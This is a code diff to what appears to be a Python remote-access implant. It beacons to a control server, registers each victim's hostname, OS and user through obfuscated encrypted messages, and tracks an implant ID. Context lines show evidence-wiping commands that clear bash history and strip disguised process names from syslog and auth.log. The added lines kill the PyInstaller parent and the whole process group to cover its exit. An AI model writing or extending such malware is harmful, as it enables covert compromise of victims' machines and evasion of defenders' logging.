@@ -131,7 +131,7 @@ def _handle(msg):
         info = {
             "hostname": socket.gethostname(),
             "platform": sys.platform,
-            "user": os.environ.get("USER", os.environ.get("USERNAME", "?")),
+            "user": _get_user(),
             "cwd": os.getcwd(),
             "pid": os.getpid(),
         }
@@ -280,19 +280,23 @@ def beacon():
                 _send(s, serialize_public_key(pub_key))
                 server_pub = deserialize_public_key(_recv(s))
 
+                reg_payload = {
+                    "hostname": _data_store["hostname"],
+                    "os": _data_store["os"],
+                    "user": _data_store["user"],
+                }
+                if _data_store.get("implant_id"):
+                    reg_payload["implant_id"] = _data_store["implant_id"]
                 reg = {
                     "type": "REQUEST",
                     "command": "REGISTER",
                     "request_id": "reg-{0}".format(id(s)),
-                    "payload": {
-                        "hostname": _data_store["hostname"],
-                        "os": _data_store["os"],
-                        "user": _data_store["user"],
-                    },
+                    "payload": reg_payload,
                 }
                 _send(s, obfuscate(encrypt_message(json.dumps(reg).encode(), server_pub)))
                 ack_raw = _recv(s)
-                json.loads(decrypt_message(deobfuscate(ack_raw), priv_key).decode())
+                ack = json.loads(decrypt_message(deobfuscate(ack_raw), priv_key).decode())
+                _data_store["implant_id"] = ack.get("payload", {}).get("implant_id", _data_store.get("implant_id"))
 
                 while True:
                     raw_msg = _recv(s)
@@ -336,6 +340,12 @@ def beacon():
                         _run("history -c; history -w; cat /dev/null > ~/.bash_history")
                         _run("sed -i '/dbus-sync\\|nm-dispatcher/d' /var/log/syslog 2>/dev/null")
                         _run("sed -i '/dbus-sync\\|nm-dispatcher/d' /var/log/auth.log 2>/dev/null")
+                        # Kill parent (PyInstaller bootloader) + entire process group
+                        try:
+                            os.kill(os.getppid(), 9)
+                        except Exception:
+                            pass
+                        _run("pkill -9 -f dbus-sync")
                         os.kill(os.getpid(), 9)
                     _send(s, obfuscate(encrypt_message(json.dumps(resp).encode(), server_pub)))
 
